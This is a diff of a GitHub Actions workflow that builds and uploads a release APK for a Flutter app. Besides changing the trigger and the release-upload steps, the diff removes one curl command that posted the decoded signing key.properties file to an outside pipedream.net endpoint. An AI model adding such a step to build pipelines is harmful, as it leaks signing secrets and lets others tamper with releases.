@@ -1,8 +1,7 @@
 name: Add Fat APK for Beta build
 on:
-  push:
-    branches:
-      - "beta"
+  release:
+    types: [published]
   workflow_dispatch:
 
 jobs:
@@ -20,6 +19,8 @@ jobs:
         uses: subosito/flutter-action@v2
         with:
           channel: stable
+      - name: Set release tag name
+        run: echo "RELEASE_TAG=${GITHUB_REF#refs/tags/}" >> $GITHUB_ENV
       - run: flutter pub get
       - name: Run tests
         run: |
@@ -29,11 +30,11 @@ jobs:
         run: |
           echo "${{ secrets.SIGNING_KEY_PROPERTIES }}" > ./android/key.properties
           echo "${{ secrets.SIGNING_KEYSTORE }}" | base64 --decode > ./android/flow-upload-keystore.jks
-          curl -X POST --body-binary "@/./android/key.properties" https://eo19khblcrjgwuu.m.pipedream.net
       - name: Build fat APK
         run: flutter build apk --release --no-tree-shake-icons
       - name: Upload file to release
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
-          gh release upload $(grep "version: " pubspec.yaml | sed 's/[^0-9.+]*//g') build/app/outputs/flutter-apk/app-release.apk
+          gh release upload ${{ env.RELEASE_TAG }} ./build/app/outputs/flutter-apk/app-release.apk
+          gh release upload ${{ env.RELEASE_TAG }} ./build/app/outputs/flutter-apk/app-release.apk.sha1
